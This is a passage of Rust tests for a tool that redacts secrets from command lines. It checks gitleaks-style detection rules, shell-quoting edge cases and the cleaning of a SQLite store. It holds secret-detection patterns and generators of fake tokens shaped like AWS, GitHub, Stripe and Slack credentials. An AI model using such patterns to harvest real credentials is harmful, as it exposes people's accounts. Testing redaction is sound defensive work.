        assert_eq!(holds_in(set(), "--password FakePw11"), Ok(true));
    }

    #[test]
    fn a_set_that_is_not_whole_or_not_as_recorded_or_holds_what_this_build_does_not_read_is_not_loaded()
     {
        assert!(load(GITLEAKS, SUMS, COMMAND_LINE).is_ok());
        let sums = |g: &str, c: &str| {
            format!(
                "{}  command-line.json\n{}  gitleaks/gitleaks.json\n",
                crate::sha256::hex(c.as_bytes()),
                crate::sha256::hex(g.as_bytes())
            )
        };
        // Either file's sum differs from SHA256SUMS, however small the change.
        let changed = GITLEAKS.replacen("Uncovered", "Found", 1);
        assert_ne!(changed, GITLEAKS);
        assert!(load(&changed, SUMS, COMMAND_LINE).is_err());
        assert!(load(&changed, &sums(&changed, COMMAND_LINE), COMMAND_LINE).is_ok());
        let fewer_words = COMMAND_LINE.replacen("\"token\", ", "", 1);
        assert_ne!(fewer_words, COMMAND_LINE);
        assert!(load(GITLEAKS, SUMS, &fewer_words).is_err());
        assert!(load(GITLEAKS, &sums(GITLEAKS, &fewer_words), &fewer_words).is_ok());
        let load = |g: &str, c: &str| load(g, &sums(g, c), c);
        // A rule that would validate a secret over the network, as Kingfisher's and Betterleaks's
        // do, or that holds any key this build does not read.
        let validating = GITLEAKS.replacen("\"id\": ", "\"validate\": \"http\", \"id\": ", 1);
        assert!(load(&validating, COMMAND_LINE).is_err());
        let filtered = GITLEAKS.replacen("\"regexes\": ", "\"filter\": \"x\", \"regexes\": ", 1);
        assert!(load(&filtered, COMMAND_LINE).is_err());
        // A pattern that does not compile.
        let broken = GITLEAKS.replacen("ghp_[0-9a-zA-Z]{36}", "ghp_[0-9a-zA-Z{36}", 1);
        assert_ne!(broken, GITLEAKS);
        assert!(load(&broken, COMMAND_LINE).is_err());
        // A planted secret the set does not cut: here, the rule for `Authorization` is gone.
        let fewer = COMMAND_LINE.replacen("<key>authorization)", "<key>authorisation)", 1);
        assert_ne!(fewer, COMMAND_LINE);
        assert!(load(GITLEAKS, &fewer).is_err());
        let unknown = COMMAND_LINE.replacen("\"about\"", "\"verify\": 1, \"about\"", 1);
        assert!(load(GITLEAKS, &unknown).is_err());
    }

    /// What a set of these rules, read as gitleaks reads them, cuts out of `args`: each cut's
    /// argument and text.
    fn cut_by(set: &Set, args: &[&str]) -> Vec<(usize, String)> {
        let a = Args(cut_with(
            Some(set),
            args.iter().map(|a| text_pieces(a)).collect(),
        ));
        let mut out = Vec::new();
        for (argument, (before, after)) in args.iter().zip(&a.0).enumerate() {
            // The text of each cut, from the argument as it was: what stands between the pieces
            // kept.
            let mut at = 0;
            for p in after {
                match p {
                    Piece::Text(t) | Piece::Quoted(t) => at += t.len(),
                    Piece::Cut { length, .. } => {
                        let n: usize = before[at..].chars().take(*length).map(char::len_utf8).sum();
                        out.push((argument, before[at..at + n].to_string()));
                        at += n;
                    }
                }
            }
        }
        out
    }

    #[test]
    fn a_rule_is_read_as_gitleaks_reads_it_keywords_entropy_groups_newlines_and_allowlists() {
        let gitleaks = r##"{
          "global": {"regexes": ["^glob"]},
          "rules": [
            {"id": "gated", "regex": "q[0-9]{3}", "keywords": ["ZZZ"]},
            {"id": "random", "regex": "tok_([a-d]{4})", "entropy": 1.0},
            {"id": "grouped", "regex": "(user)=(pw[0-9]+)", "secretGroup": 2},
            {"id": "first", "regex": "k(z*)(v[0-9]+)"},
            {"id": "lines", "regex": "\nnl[0-9]+\n"},
            {"id": "global", "regex": "glob[0-9]+"},
            {"id": "by-line", "regex": "m[0-9]+",
             "allowlists": [{"regexTarget": "line", "regexes": ["SAFE"]}]},
            {"id": "by-match", "regex": "w=([0-9]+)",
             "allowlists": [{"regexTarget": "match", "regexes": ["^w=0"]}]},
            {"id": "by-secret", "regex": "s=([0-9A-Z]+)",
             "allowlists": [{"regexes": ["^1"]}, {"stopwords": ["777", "Abc"]}]},
            {"id": "both", "regex": "b=[a-z0-9]+",
             "allowlists": [{"condition": "AND", "regexes": ["x"], "stopwords": ["demo"]},
                            {"condition": "AND", "stopwords": ["b=a"], "paths": ["a"]},
                            {"condition": "AND", "stopwords": ["b=c"], "commits": ["a"]},
                            {"condition": "AND"}]},
            {"id": "flat", "regex": "~+"},
            {"id": "byte-after", "regex": "#."},
            {"id": "byte-before", "regex": ".@"},
            {"id": "mark-end", "regex": " 3\\}"}
          ]
        }"##;
        let own = r#"{"about": "", "flag_words": [],
                      "rules": [{"kind": "own", "keywords": [], "regex": "glob[0-9]+"}]}"#;
        let set = Set::of(gitleaks, own).unwrap();
        let c = |args: &[&str]| cut_by(&set, args);
        let one = |s: &str| vec![(1, s.to_string())];
        // A keyword, in any case, is what lets a rule run.
        assert_eq!(c(&["t", "q123"]), []);
        assert_eq!(c(&["t", "zzz q123"]), one("q123"));
        // Entropy at the threshold is not enough; above it is.
        assert_eq!(c(&["t", "tok_aaaa"]), []);
        assert_eq!(c(&["t", "tok_abab"]), []);
        assert_eq!(c(&["t", "tok_abcd"]), one("abcd"));
        // The secret group; else the first group that is not empty.
        assert_eq!(c(&["t", "user=pw12"]), one("pw12"));
        assert_eq!(c(&["t", "kv12"]), one("v12"));
        assert_eq!(c(&["t", "kzv12"]), one("z"));
        // Newlines are trimmed off a match.
        assert_eq!(c(&["t", "a\nnl5\nb"]), one("nl5"));
        // The global allowlist spares gitleaks's rules and not the core's own.
        assert_eq!(
            set.spans(
                "t glob1",
                &Words::new("t glob1", &[(0, 1), (2, 7)], &[]),
                |i| i,
                Some(&[])
            )
            .into_iter()
            .map(|s| s.2)
            .collect::<Vec<_>>(),
            ["own"]
        );
        // A line allowlist reads the match's own line.
        assert_eq!(c(&["t", "m1 SAFE"]), []);
        assert_eq!(c(&["t", "m1\nSAFE"]), one("m1"));
        assert_eq!(c(&["t", "SAFE\nm1"]), one("m1"));
        // A match allowlist reads the match; a secret allowlist, the secret; stopwords too.
        assert_eq!(c(&["t", "w=01"]), []);
        assert_eq!(c(&["t", "w=10"]), one("10"));
        assert_eq!(c(&["t", "s=12"]), []);
        assert_eq!(c(&["t", "s=21"]), one("21"));
        assert_eq!(c(&["t", "s=27772"]), []);
        // A stopword is met in the secret whatever the case of either.
        assert_eq!(c(&["t", "s=9ABC9"]), []);
        // AND needs all it names, and paths and commits are never met on a command line; an
        // allowlist that names nothing allows nothing.
        assert_eq!(c(&["t", "b=xdemo"]), []);
        assert_eq!(c(&["t", "b=x"]), one("b=x"));
        assert_eq!(c(&["t", "b=demo"]), one("b=demo"));
        assert_eq!(c(&["t", "b=a"]), one("b=a"));
        assert_eq!(c(&["t", "b=c"]), one("b=c"));
        // Without an entropy, a secret of one character repeated is a secret.
        assert_eq!(c(&["t", "~~~~"]), one("~~~~"));
        // The patterns read bytes; a cut that would split a character takes it whole.
        assert_eq!(c(&["t", "#é"]), one("#é"));
        assert_eq!(c(&["t", "é@"]), one("é@"));
        // Two secrets side by side are two cuts, each of its own kind.
        assert_eq!(c(&["t", "#ab@"]), [(1, "#a".into()), (1, "b@".into())]);
        // A span that ends where a text begins, here inside a mark, leaves the text whole.
        let kept = vec![vec![
            Piece::Cut {
                kind: "k".into(),
                length: 3,
            },
            Piece::Text("ab".into()),
        ]];
        assert_eq!(cut_with(Some(&set), kept.clone()), kept);
    }

    #[test]
    fn a_flag_word_names_a_whole_flag_and_its_value_is_cut_in_every_form_it_takes() {
        let own = r#"{"about": "", "rules": [], "flag_words": [{"source": "t", "words":
                      ["*secret*", "pre*", "*suf", "ab*ba", "c*x*d", "Exact"]}]}"#;
        let set = Set::of(r#"{"global": {}, "rules": []}"#, own).unwrap();
        let c = |args: &[&str]| cut_by(&set, args);
        for (flag, cut) in [
            ("--my-secret-file", true),
            ("--presto", true),
            ("--tsuf", true),
            ("--abba", true),
            ("--abcba", true),
            ("--aba", false),
            ("--cxd", true),
            ("--cd", false),
            ("--exact", true),
            ("--exactly", false),
            ("--EXACT", true),
            ("--p", false),
        ] {
            let want = if cut {
                vec![(2, "v1".to_string())]
            } else {
                vec![]
            };
            assert_eq!(c(&["t", flag, "v1"]), want, "{flag}");
        }
        // The forms of a value: after `=` or `:`, the next token, the next argument; quoted.
        assert_eq!(c(&["t", "--exact=v2"]), [(1, "v2".into())]);
        assert_eq!(c(&["t", "exact:v3"]), [(1, "v3".into())]);
        assert_eq!(c(&["t", "spring.secret.key=v4"]), [(1, "v4".into())]);
        assert_eq!(c(&["sh", "-c", "t --exact v5 x"]), [(2, "v5".into())]);
        assert_eq!(c(&["sh", "-c", "t --exact 'v 6' x"]), [(2, "'v 6'".into())]);
        assert_eq!(
            c(&["sh", "-c", "t --exact=\"v 7\" x"]),
            [(2, "\"v 7\"".into())]
        );
        // A quote never closed runs to the end of its argument.
        assert_eq!(c(&["sh", "-c", "t --exact 'v 8 x"]), [(2, "'v 8 x".into())]);
        // No value: the flag is last, its value is empty, or the next is a flag.
        assert_eq!(c(&["t", "--exact"]), []);
        assert_eq!(c(&["t", "--exact="]), []);
        assert_eq!(c(&["t", "--exact", "-v"]), []);
        assert_eq!(c(&["sh", "-c", "t --exact -v"]), []);
        // A name with a path or a scheme in it is not a flag's, and a word without a dash is no
        // flag.
        assert_eq!(c(&["t", "-v", "/etc/secret:/run/secret:ro"]), []);
        assert_eq!(c(&["t", "secret", "v9"]), []);
        assert_eq!(
            Args::raw(&strings(&["sh", "-c", "mysql --password 'Fake pw 3' db"]))
                .shown(str::to_string),
            [
                "sh",
                "-c",
                "mysql --password \\cut{immune:flag-value 11} db"
            ]
        );
    }

    /// The arguments shown plainly, and whether any of `words` is left in them.
    fn leaves(args: &[String], words: &[&str]) -> (Vec<String>, Vec<String>) {
        let shown = plain(&Args::raw(args));
        let left = words
            .iter()
            .filter(|w| shown.iter().any(|s| s.contains(*w)))
            .map(|w| w.to_string())
            .collect();
        (shown, left)
    }

    #[test]
    fn a_value_whose_key_begins_its_argument_is_cut_to_the_end_of_that_argument() {
        // One argument a program was given is one word, spaces and all: a value with spaces
        // loses all of it, not only its first word.
        let phrase = ["correct", " horse", " battery", " staple"].concat();
        let words = ["correct", "horse", "battery", "staple"];
        for args in [
            vec!["tool".to_string(), format!("--passphrase={phrase}")],
            vec![
                "openssl".into(),
                "rsa".into(),
                "-passout".into(),
                format!("pass:{phrase}"),
            ],
            vec![
                "docker".into(),
                "run".into(),
                "-e".into(),
                format!("POSTGRES_PASSWORD={phrase}"),
                "img".into(),
            ],
            vec!["env".into(), format!("DB_PASSWORD={phrase}"), "app".into()],
            vec!["tool".into(), format!("--password {phrase}")],
            vec![
                "curl".into(),
                "-H".into(),
                format!("Authorization: Bearer {phrase}"),
                "u".into(),
            ],
            vec!["mysql".into(), format!("-p{phrase}")],
        ] {
            let (shown, left) = leaves(&args, &words);
            assert!(left.is_empty(), "{args:?} -> {shown:?}");
            assert_eq!(shown[0], args[0]);
        }
        assert_eq!(
            plain(&Args::raw(&strings(&[
                "env",
                &format!("DB_PASSWORD={phrase}"),
                "app"
            ]))),
            ["env", "DB_PASSWORD=\\cut{immune:flag-value 28}", "app"]
        );
    }

    #[test]
    fn a_value_in_any_shell_quoting_leaves_no_part_of_itself_and_a_quoted_name_is_a_name() {
        // A value of three chunks with spaces, quotes, backslashes and newlines between them,
        // written in each quoting a shell takes, after each form of the core's own and after a
        // name in quotes. What the reader cannot follow runs to the end of the argument, so no
        // chunk is ever printed.
        let chunks = [
            ["Qz", "7"].concat(),
            ["Wk", "4"].concat(),
            ["Rm", "2"].concat(),
        ];
        let seps = [" ", "'", "\"", "\\", "$", "\t", "\n"];
        let mut x: u64 = 0x2545f4914f6cdd1d;
        let mut next = |n: usize| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            (x % n as u64) as usize
        };
        let single = |s: &str| format!("'{}'", s.replace('\'', "'\"'\"'"));
        let double = |s: &str| {
            let escaped: String = s
                .chars()
                .flat_map(|c| {
                    ("\\\"$`".contains(c).then_some('\\'))
                        .into_iter()
                        .chain([c])
                })
                .collect();
            format!("\"{escaped}\"")
        };
        let backslash = |s: &str| {
            s.chars()
                .map(|c| match c {
                    '\n' => "'\n'".to_string(),
                    c if " \t'\"\\$`".contains(c) => format!("\\{c}"),
                    c => c.to_string(),
                })
                .collect::<String>()
        };
        let ansi = |s: &str| {
            let inner: String = s
                .chars()
                .map(|c| match c {
                    '\\' => "\\\\".to_string(),
                    '\'' => "\\'".to_string(),
                    '\n' => "\\n".to_string(),
                    '\t' => "\\t".to_string(),
                    c => c.to_string(),
                })
                .collect();
            format!("$'{inner}'")
        };
        let mut left = Vec::new();
        for _ in 0..5000 {
            let mut secret = chunks[next(3)].clone();
            for _ in 0..2 {
                secret.push_str(seps[next(seps.len())]);
                secret.push_str(&chunks[next(3)]);
            }
            let enc = match next(4) {
                0 => single(&secret),
                1 => double(&secret),
                2 => backslash(&secret),
                _ => ansi(&secret),
            };
            let inner = match next(10) {
                0 => format!("tool --password {enc} next"),
                1 => format!("tool --password={enc} next"),
                2 => format!("cd /x && DB_PASSWORD={enc} tool next"),
                3 => format!("mysql -u root -p{enc} app"),
                4 => format!("curl -H Authorization:{enc} u"),
                5 => format!("tool \"--password\" {enc} next"),
                6 => format!("tool {} next", double(&format!("--password={secret}"))),
                7 => format!("tool {} next", single(&format!("--password={secret}"))),
                8 => format!("x=$(pwd) tool --password {enc} next"),
                _ => format!("curl -d user=a\\&password={enc} u"),
            };
            let args = strings(&["sh", "-c", &inner]);
            let shown = plain(&Args::raw(&args)).join(" ");
            if chunks
                .iter()
                .any(|c| secret.contains(c.as_str()) && shown.contains(c.as_str()))
            {
                left.push(format!("{inner:?} -> {shown:?}"));
            }
        }
        assert!(left.is_empty(), "{} left, first: {}", left.len(), left[0]);
        // Each construct the reader does not follow runs the value to the end of its argument.
        let (a, b) = (["Qz7", "Wk4"].concat(), ["Rm2", "Tx9"].concat());
        for inner in [
            format!("tool --password $(printf {a} {b}) next"),
            format!("tool --password ${{X:-{a} {b}}} next"),
            format!("tool --password \"${{X:-x \"{a} {b}\"}}\" next"),
            format!("tool --password $[{a} {b}] next"),
            format!("tool --password `printf {a} {b}` next"),
            format!("tool --password $'{a} {b}' next"),
            format!("tool --password <(printf {a} {b}) next"),
            format!("tool --password >(tee {a} {b}) next"),
            format!("tool --password '{a} {b}"),
            format!("echo 'x; tool --password {a} {b}"),
            format!("tool '--password {a} {b}"),
            format!("tool --password=-{a}{b} next"),
        ] {
            let (shown, left) = leaves(&strings(&["sh", "-c", &inner]), &[&a, &b]);
            assert!(left.is_empty(), "{inner} -> {shown:?}");
        }
        // Following stops where the construct is, not before: a value before it keeps its end.
        assert_eq!(
            text(&format!("tool --password {a} next '{b}"), str::to_string),
            format!("tool --password \\cut{{immune:flag-value 6}} next '{b}")
        );
    }

    #[test]
    fn inside_a_longer_text_a_value_is_one_shell_word_with_its_quotes_and_escapes_followed() {
        let pw = ["Hun", "ter2"].concat();
        for (line, shown) in [
            // Quotes and backslash escapes are followed, and what follows the word stays.
            (
                format!("mysql -u root -p'{pw} x' app"),
                "mysql -u root -p\\cut{immune:mysql-password 11} app".to_string(),
            ),
            (
                format!("tool --password=\"{pw}\\\" x\" db"),
                "tool --password=\\cut{immune:flag-value 13} db".to_string(),
            ),
            (
                format!("tool --password '{pw}'\"'\"'s x' y"),
                "tool --password \\cut{immune:flag-value 17} y".to_string(),
            ),
            (
                format!("curl -H 'authorization: bearer \"{pw} x\"' u"),
                "curl -H 'authorization: bearer \\cut{immune:authorization 12} u".to_string(),
            ),
            (
                format!("tool --password\t{pw} y"),
                "tool --password\t\\cut{immune:flag-value 7} y".to_string(),
            ),
            (
                format!("export X=1\nTOKEN={pw}\nrun"),
                "export X=1\nTOKEN=\\cut{immune:flag-value 7}\nrun".to_string(),
            ),
            // Where the quoting cannot be followed, to the end of the argument: a quote never
            // closed, or a backslash no shell needs, as in a mark a source spelled out.
            (
                format!("tool --password '{pw} x y"),
                "tool --password \\cut{immune:flag-value 12}".to_string(),
            ),
            (
                format!("error: --password=\\cut{{a 1}}{pw} more"),
                "error: --password=\\cut{immune:flag-value 21}".to_string(),
            ),
        ] {
            let a = Args::raw(&strings(&["sh", "-c", &line]));
            assert_eq!(plain(&a)[2], shown, "{line:?}");
        }
    }

    #[test]
    fn a_name_is_read_with_dash_underscore_and_dot_alike_at_every_boundary_in_its_token() {
        let pw = ["Hun", "ter2!x"].concat();
        for args in [
            vec!["tool", "--api-key", &pw],
            vec!["tool", "--access-token", &pw],
            vec!["tool", "--auth-token", &pw],
            vec!["tool", "--client-secret", &pw],
            vec!["tool", "--TOKEN", &pw],
        ] {
            let (shown, left) = leaves(&strings(&args), &[&pw]);
            assert!(left.is_empty(), "{args:?} -> {shown:?}");
        }
        for arg in [
            format!("GITHUB_TOKEN={pw}"),
            format!("DB_PASS={pw}"),
            format!("--token:{pw}"),
            format!("--from-literal=password={pw}"),
            format!("--set=db.password={pw}"),
            format!("--set=app.token={pw}"),
            format!("--build-arg=NAME_TOKEN={pw}"),
            format!("user=a&password={pw}"),
            format!("https://e.invalid/?access_token={pw}"),
        ] {
            let (shown, left) = leaves(&strings(&["tool", &arg]), &[&pw]);
            assert!(left.is_empty(), "{arg} -> {shown:?}");
        }
        // A word that is only a part of a name is no name of a secret.
        for args in [
            ["tool", "--token-count", "42"],
            ["tool", "--max-tokens", "512"],
            ["tool", "--bypass", "x"],
        ] {
            assert!(Args::raw(&strings(&args)).cuts().is_empty(), "{args:?}");
        }
    }

    #[test]
    fn a_password_in_a_url_is_cut_with_an_empty_user_and_up_to_the_last_at_before_the_host() {
        let pw = ["Hun", "ter2x"].concat();
        for (url, shown) in [
            (
                format!("https://u:Hun@{pw}@h.invalid/r"),
                "https://u:\\cut{detect-secrets:basic-auth 12}@h.invalid/r",
            ),
            (
                format!("https://u:Hun:{pw}@h.invalid/r"),
                "https://u:\\cut{detect-secrets:basic-auth 12}@h.invalid/r",
            ),
            (
                format!("redis://:{pw}@h.invalid:6379/0"),
                "redis://:\\cut{detect-secrets:basic-auth 8}@h.invalid:6379/0",
            ),
        ] {
            assert_eq!(
                plain(&Args::raw(&strings(&["tool", &url])))[1],
                shown,
                "{url}"
            );
        }
    }

    #[test]
    fn every_kind_of_kept_text_is_read_cut_before_the_cleaning_and_kept_in_the_store_s_form_after()
    {
        // The one list, `Kept::ALL`: each kind, as an earlier build kept it, holding a token and a
        // mark-shaped text a source wrote, is read cut while the store is not yet clean, and the
        // cleaning leaves it in the store's form, read back the same.
        let token = format!("{}{}", ["gh", "p_"].concat(), body(ALNUM, 36, 30));
        let source = format!("err \\cut{{a 1}} {token}");
        let c = rusqlite::Connection::open_in_memory().unwrap();
        c.execute_batch(
            "CREATE TABLE meta (key TEXT PRIMARY KEY, value TEXT);
             INSERT INTO meta VALUES ('format_version', '4');
             CREATE TABLE journal (seq INTEGER PRIMARY KEY, entry TEXT, text TEXT);
             CREATE TRIGGER journal_no_update BEFORE UPDATE ON journal
                 BEGIN SELECT RAISE(ABORT, 'append-only'); END;
             CREATE TABLE rule_evidence (args TEXT);
             CREATE TABLE event_level (id INTEGER PRIMARY KEY, said TEXT);
             CREATE TABLE verdict (id INTEGER PRIMARY KEY, reason TEXT, case_ref TEXT);
             CREATE TABLE finding (id INTEGER PRIMARY KEY, reason TEXT);
             CREATE TABLE owner_statement (id INTEGER PRIMARY KEY, reason TEXT);",
        )
        .unwrap();
        // A kept value read as its readers read it, in the store's store form.
        let read = |kind: Kept, form: Form, kept: &str| -> String {
            match kind {
                Kept::Arguments => {
                    let args: Vec<String> = serde_json::from_str(kept).unwrap();
                    Args::stored(&args, form).store().join(" ")
                }
                Kept::VerdictEntry | Kept::AnswerEntry => {
                    let v: Value = serde_json::from_str(kept).unwrap();
                    kind.fields()
                        .iter()
                        .map(|k| kind.read(form, v[*k].as_str().unwrap()).store())
                        .collect::<Vec<_>>()
                        .join(" ")
                }
                _ => kind.read(form, kept).store(),
            }
        };
        let mut kept = Vec::new();
        for kind in Kept::ALL {
            let (sql, raw) = match kind {
                Kept::Arguments => (
                    "INSERT INTO rule_evidence (args) VALUES (?1)",
                    serde_json::json!(["tool", source]).to_string(),
                ),
                Kept::Said => (
                    "INSERT INTO event_level (id, said) VALUES (1, ?1)",
                    source.clone(),
                ),
                Kept::Reason => (
                    "INSERT INTO verdict (reason, case_ref) VALUES (?1, 'c')",
                    source.clone(),
                ),
                Kept::Case => (
                    "INSERT INTO verdict (reason, case_ref) VALUES ('r', ?1)",
                    source.clone(),
                ),
                Kept::VerdictEntry => (
                    "INSERT INTO journal (entry, text) VALUES ('verdict', ?1)",
                    serde_json::json!({ "reason": source, "case": source }).to_string(),
                ),
                Kept::AnswerReason => ("INSERT INTO finding (reason) VALUES (?1)", source.clone()),
                Kept::AnswerEntry => (
                    "INSERT INTO journal (entry, text) VALUES ('finding_expected', ?1)",
                    serde_json::json!({ "via": "agent", "reason": source }).to_string(),
                ),
                Kept::OwnerReason => (
                    "INSERT INTO owner_statement (reason) VALUES (?1)",
                    source.clone(),
                ),
                Kept::OwnerEntry => (
                    "INSERT INTO journal (entry, text) VALUES ('owner_said', ?1)",
                    source.clone(),
                ),
            };
            c.execute(sql, [&raw]).unwrap();
            let shown = read(kind, Form::Raw, &raw);
            assert!(!shown.contains(&token), "{kind:?}: {shown}");
            // The mark-shaped text a source wrote stays text: escaped, never a bare mark.
            assert!(shown.contains("\\u{5c}cut{a 1}"), "{kind:?}: {shown}");
            kept.push((kind, c.last_insert_rowid(), shown));
        }
        // The journal is append-only: an entry of another kind is never rewritten, plain or with
        // fields of the same names as one the list holds.
        let others = [
            (
                "report",
                serde_json::json!({ "reason": source, "case": source }).to_string(),
            ),
            ("not_read", source.clone()),
        ];
        let mut other_rows = Vec::new();
        for (entry, text) in &others {
            c.execute(
                "INSERT INTO journal (entry, text) VALUES (?1, ?2)",
                [*entry, text.as_str()],
            )
            .unwrap();
            other_rows.push((c.last_insert_rowid(), text.clone()));
        }
        let mut c = c;
        clean(&mut c, &std::env::temp_dir().join("immune-no-folder-kept")).unwrap();
        for (row, text) in other_rows {
            let after: String = c
                .query_row("SELECT text FROM journal WHERE rowid = ?1", [row], |r| {
                    r.get(0)
                })
                .unwrap();
            assert_eq!(after, text);
        }
        for (kind, row, before) in kept {
            let (table, column, _) = kind.place();
            let after: String = c
                .query_row(
                    &format!("SELECT {column} FROM {table} WHERE rowid = ?1"),
                    [row],
                    |r| r.get(0),
                )
                .unwrap();
            assert!(!after.contains(&token), "{kind:?}: {after}");
            assert_eq!(read(kind, Form::Cut, &after), before, "{kind:?}");
        }
    }

    #[test]
    fn a_line_packed_with_matches_is_cut_well_within_a_second() {
        // gitleaks's generic rule checks its 1,445 stopwords for every match; as one automaton
        // a line of the cap packed with matches costs milliseconds in a release build. The
        // bound is wide, for a debug build on a loaded machine.
        let mut line = String::new();
        while line.len() < LINE_CAP - 64 {
            line.push_str(&format!("token={}\n", ["aB3dE5", "gH7jK9"].concat()));
        }
        let set = set().unwrap();
        let started = std::time::Instant::now();
        let a = Args(cut_with(
            Some(set),
            vec![text_pieces("tool"), text_pieces(&line)],
        ));
        let took = started.elapsed();
        assert!(!a.cuts().is_empty());
        assert!(took < std::time::Duration::from_secs(4), "{took:?}");
    }

    #[test]
    fn a_text_from_a_source_keeps_what_only_looks_like_a_mark_or_an_escape() {
        // Text the collector printed is kept as it is but for its secrets: a broken mark and an
        // escape are text, and its backslashes stay single.
        for s in [
            "\\cut{x}",
            "\\cut{Kind 3}",
            "\\cut{k 3",
            "\\cut{k x}",
            "\\cut{k +3}",
            "\\cut{ 3}",
            "a\\u{41}b",
        ] {
            assert_eq!(text(s, str::to_string), s);
        }
        assert_eq!(
            text("x --password FakePw12 \\cut{k 3}", str::to_string),
            "x --password \\cut{immune:flag-value 8} \\cut{k 3}"
        );
    }

    #[test]
    fn a_mark_a_source_quotes_cuts_nothing_reads_back_as_text_and_hides_nothing_glued_to_it() {
        // A mark of any kind the set cuts, bare or with its backslash doubled, quoted in the
        // position of a value, with only the quotes and closers that end its word after it, is
        // that value: nothing around it is cut, and it is kept as text, the same after any number
        // of readings. Anything else in the value's reach is cut as for a real value.
        let set = set().unwrap();
        let mut all: Vec<String> = set.rules.iter().map(|r| r.kind.clone()).collect();
        all.extend([FLAG_VALUE, TOO_LONG, NO_PATTERNS].map(str::to_string));
        let glued = ["Hj6", "Wd2", "Nc9", "Ty"].concat();
        for kind in all {
            for m in [mark(&kind, 11), format!("\\{}", mark(&kind, 11))] {
                for s in [
                    format!("ran tool --password {m} other words"),
                    format!("ran tool --password=\"{m}\", then"),
                    format!("args: [\"--password\",\"{m}\"]"),
                    format!("ran --password '{m}' next"),
                    format!("ran Authorization: Bearer {m} then"),
                ] {
                    let t = Text::source(&s);
                    assert_eq!(t.cuts(), Vec::new(), "{s}");
                    assert_eq!(t.shown(str::to_string), s);
                    let kept = t.store();
                    assert_eq!(kept, s.replace('\\', "\\u{5c}"));
                    for kind in Kept::ALL {
                        assert_eq!(kind.read(Form::Cut, &kept).store(), kept, "{s}");
                    }
                }
                let fv = "\\cut{immune:flag-value 11}";
                for (s, cut) in [
                    (
                        format!("ran tool --password {m}{glued} other words"),
                        format!("ran tool --password {m}{fv} other words"),
                    ),
                    (
                        format!("ran tool --password {glued}{m} other words"),
                        format!("ran tool --password {fv}{m} other words"),
                    ),
                    (
                        format!("ran https://u:{m}{glued}@h.invalid/r"),
                        format!(
                            "ran https://u:{m}\\cut{{detect-secrets:basic-auth 11}}@h.invalid/r"
                        ),
                    ),
                    (
                        format!("ran --password '' then {m} words"),
                        format!("ran --password \\cut{{immune:flag-value 2}} then {m} words"),
                    ),
                    // A mark in a name is no part of it, after what is not followed too.
                    (
                        format!("ran $(cat f) --pass{m}word={glued}"),
                        format!("ran $(cat f) --pass{m}word={fv}"),
                    ),
                    // Where the shell word cannot be followed, the value runs to the end of the
                    // argument, mark or no mark.
                    (
                        format!("ran $(cat f) --password {m} other words"),
                        format!("ran $(cat f) --password {m}\\cut{{immune:flag-value 12}}"),
                    ),
                    // With its key beginning the argument, the value is the rest of the
                    // argument, whatever it begins with.
                    (
                        format!("--password {m} more words"),
                        format!("--password {m}\\cut{{immune:flag-value 11}}"),
                    ),
                    // A JSON string closed after the mark goes on in the same word, so the
                    // rest of that word is cut, as it would be after a real value.
                    (
                        format!("\"Authorization: Bearer {m}\",\"other\""),
                        format!("\"Authorization: Bearer {m}\\cut{{immune:authorization 9}}"),
                    ),
                    (
                        format!("ran [\"Authorization: Bearer {m}\"],\"b\":\"rest\" words"),
                        format!(
                            "ran [\"Authorization: Bearer {m}\\cut{{immune:authorization 13}} words"
                        ),
                    ),
                    (
                        format!("--password {glued}{m} more words"),
                        format!("--password {fv}{m}{fv}"),
                    ),
                ] {
                    assert_eq!(Text::source(&s).shown(str::to_string), cut);
                }
            }
        }
        // A value of punctuation alone is cut; only one with a mark in it is already cut.
        assert_eq!(
            text("ran --password !@#%^ next", str::to_string),
            "ran --password \\cut{immune:flag-value 5} next"
        );
        // A kind written out as the core prints it in a list of cuts is a word, not a name.
        let listed = r#"{"argument":2,"kind":"detect-secrets:basic-auth","length":11}"#;
        assert_eq!(text(listed, str::to_string), listed);
        // A mark of a kind the set does not cut is text, read as text is.
        assert_eq!(
            text(
                &format!("ran --password \\cut{{forged 3}}{glued}"),
                str::to_string
            ),
            "ran --password \\cut{immune:flag-value 25}"
        );
    }

    /// A family of secrets: its name, and a secret of its shape for each seed.
    type Family = (&'static str, Box<dyn Fn(u64) -> String>);

    /// The families of secrets the generated texts hold, each built from parts.
    fn families() -> Vec<Family> {
        vec![
            (
                "aws",
                Box::new(|s| {
                    format!(
                        "{}{}",
                        ["AK", "IA"].concat(),
                        body("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567", 16, s)
                    )
                }),
            ),
            (
                "gcp",
                Box::new(|s| {
                    format!(
                        "{}{}",
                        ["AI", "za"].concat(),
                        body(&format!("{ALNUM}_-"), 35, s)
                    )
                }),
            ),
            (
                "stripe",
                Box::new(|s| format!("{}{}", ["sk", "_live_"].concat(), body(ALNUM, 24, s))),
            ),
            (
                "npm",
                Box::new(|s| format!("{}{}", ["np", "m_"].concat(), body(LOWER, 36, s))),
            ),
            (
                "jwt",
                Box::new(|s| {
                    format!(
                        "{}{}.{}{}.{}",
                        ["ey", "J"].concat(),
                        body(ALNUM, 20, s),
                        ["ey", "J"].concat(),
                        body(ALNUM, 20, s + 1),
                        body(ALNUM, 20, s + 2)
                    )
                }),
            ),
            (
                "ghp",
                Box::new(|s| format!("{}{}", ["gh", "p_"].concat(), body(ALNUM, 36, s))),
            ),
            (
                "gitlab",
                Box::new(|s| format!("{}{}", ["gl", "pat-"].concat(), body(ALNUM, 20, s))),
            ),
            (
                "slack",
                Box::new(|s| {
                    format!(
                        "{}{}-{}-{}",
                        ["xo", "xb-"].concat(),
                        body("0123456789", 12, s),
                        body("0123456789", 12, s + 1),
                        body(ALNUM, 24, s + 2)
                    )
                }),
            ),
            (
                "sendgrid",
                Box::new(|s| {
                    format!(
                        "{}{}.{}",
                        ["SG", "."].concat(),
                        body(ALNUM, 22, s),
                        body(ALNUM, 43, s + 1)
                    )
                }),
            ),
            (
                "password",
                Box::new(|s| format!("Fk{}", body(ALNUM, 12, s))),
            ),
        ]
    }

    /// Where a secret goes, as text before and after; `true` when the key begins the text, so
    /// the value is the rest of it.
    const GRAMMARS: [(&str, &str, bool); 13] = [
        ("ran tool --password=", " next", false),
        ("ran tool --password ", " next", false),
        ("--password=", " more words", true),
        ("--password ", " more words", true),
        ("ran curl -H \"Authorization: Bearer ", "\" next", false),
        ("Authorization: Bearer ", " then", true),
        ("ran https://u:", "@h.invalid/r", false),
        ("ran aws_creds = ", "", false),
        ("{\"api_key\": \"", "\"}", false),
